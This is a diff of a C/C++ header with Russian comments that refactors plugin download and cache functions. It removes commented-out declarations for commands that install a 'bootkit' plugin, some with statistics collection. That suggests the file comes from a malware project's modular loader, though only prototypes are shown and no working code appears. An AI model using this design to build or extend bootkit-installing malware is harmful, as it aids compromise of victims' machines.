@@ -140,35 +140,24 @@ namespace Plugin
 	LPBYTE DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 					  bool IsExecutable, bool UseCache, PCHAR CachePath);
 
-	//------------------------------------------------------------------------
-	//  DownloadInCache - функция загружает плагин в кэш
-	//------------------------------------------------------------------------
-	bool DownloadInCache(PCHAR PluginName, bool IsExecutable, bool IgnoreIfExists, PCHAR CachePath);
+	//-----------------------------------------------
+	//  SaveToCache
+	//  Кэширует данные плагина
+	//-----------------------------------------------
+	bool SaveToCache(PCHAR PluginName,  LPVOID Data, DWORD DataSize);
 
 
-	//------------------------------------------------------------------------
-	//  DownloadFromCache - функция загружает плагин из кэша
-	//------------------------------------------------------------------------
-	LPBYTE DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR CachePath, DWORD *PluginSize);
+	//------------------------------------------------
+	//  LoadFromCache
+	//  функция загружает плагин из кэша
+	//------------------------------------------------
+	LPBYTE LoadFromCache(PCHAR PluginName, DWORD *PluginSize);
 
-	// имя команды обновления плага
-//	extern const char* CommandUpdatePlug;
-
-	// объявление команды обновления плага
-//	bool ExecuteUpdatePlug(void* Manager, PCHAR Command, PCHAR Args);
-
-
-	// имя команды установки плага буткита
-//	extern const char* CommandInstallBk;
-
-	// объявление команды установки плага буткита
-//	bool ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args);
-
-	// имя команды установки плага буткита с включением сбора статистики
-//	extern const char* CommandInstallBkStat;
-
-	// объявление команды установки плага буткита с включением сбора статистики
-//	bool ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args);
+	//------------------------------------------------
+	//  DeleteFromCache
+	//  Функция удаляет  файл плагина из кэша
+	//------------------------------------------------
+	bool DeleteFromCache(PCHAR PluginName);
 
 }
 
